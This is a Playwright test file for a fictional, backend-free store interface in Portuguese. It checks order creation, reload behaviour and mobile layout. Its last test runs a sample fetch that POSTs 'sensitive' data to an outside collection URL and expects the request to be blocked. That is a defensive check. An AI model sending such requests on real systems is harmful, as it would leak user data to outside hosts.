import { test, expect } from "@playwright/test";

test.beforeEach(async ({page})=>{
  await page.goto("/");
  await expect(page.getByRole("button",{name:"Entrar na loja fictícia"})).toBeVisible();
});

test("QA mobile: only synthetic UI state, no remote API traffic, order create and update",async({page})=>{
  await page.setViewportSize({width:390,height:844});
  const calls:string[]=[];
  page.on("request",r=>{if(/api\/v1/.test(r.url()))calls.push(r.url())});
  await page.getByRole("button",{name:"Entrar na loja fictícia"}).click();
  await expect(page.getByText("QA SINTÉTICO · SEM BACKEND")).toBeVisible();
  const pilot=page.getByRole("region",{name:"Preparação do piloto privado"});
  await expect(pilot.getByText(/Não liberado comercialmente/)).toBeVisible();
  await pilot.getByRole("button",{name:"Verificar meu acesso"}).click();
  await expect(pilot.getByText(/Conexão da conta e dados da loja confirmados/)).toBeVisible();
  await page.getByRole("button",{name:"+ Novo pedido"}).click();
  const dialog=page.getByRole("dialog",{name:"Novo pedido"});
  await dialog.getByRole("textbox",{name:"Cliente"}).fill("Cliente QA");
  await dialog.getByPlaceholder("SKU").fill("QA-101");
  await dialog.getByPlaceholder("Descrição").fill("Produto fictício");
  await dialog.getByLabel("Quantidade").fill("2");
  await dialog.getByLabel("Preço").fill("12.50");
  await dialog.getByRole("button",{name:"Criar pedido"}).click();
  await expect(dialog).toHaveCount(0);
  await expect(page.getByRole("row").filter({hasText:"Cliente QA"})).toBeVisible();
  await page.getByRole("row").filter({hasText:"Cliente QA"}).click();
  await page.getByRole("button",{name:"Avançar: Pago"}).click();
  await expect(page.getByText("Pedido atualizado")).toBeVisible();
  expect(calls).toEqual([]);
  const width=await page.evaluate(()=>({a:document.documentElement.scrollWidth,b:innerWidth}));
  expect(width.a).toBeLessThanOrEqual(width.b+2);
});

test("QA memory-only: page reload resets synthetic orders and no real login",async({page})=>{
  await page.getByRole("button",{name:"Entrar na loja fictícia"}).click();
  await page.getByRole("button",{name:"+ Novo pedido"}).click();
  const dialog=page.getByRole("dialog",{name:"Novo pedido"});
  await dialog.getByRole("textbox",{name:"Cliente"}).fill("Pedido somente temporário");
  await dialog.getByPlaceholder("SKU").fill("QA-222");
  await dialog.getByPlaceholder("Descrição").fill("Produto somente QA");
  await dialog.getByLabel("Quantidade").fill("1");
  await dialog.getByLabel("Preço").fill("11.00");
  await dialog.getByRole("button",{name:"Criar pedido"}).click();
  await expect(page.getByRole("row").filter({hasText:"Pedido somente temporário"})).toBeVisible();
  await page.reload();
  await expect(page.getByRole("button",{name:"Entrar na loja fictícia"})).toBeVisible();
  await page.getByRole("button",{name:"Entrar na loja fictícia"}).click();
  await page.locator("nav").getByRole("button",{name:/Pedidos/}).click();
  await expect(page.getByText("Pedido somente temporário")).toHaveCount(0);
});

test("QA browser: malicious attempts cannot forward fetch outside same-origin synthetic endpoint",async({page})=>{
  await page.getByRole("button",{name:"Entrar na loja fictícia"}).click();
  const response=await page.evaluate(async()=>{
   try{await fetch("https://example.com/collect",{method:"POST",body:"sensitive"});return "ALLOWED"}
   catch{return "BLOCKED"}
  });
  expect(response).toBe("BLOCKED");
});
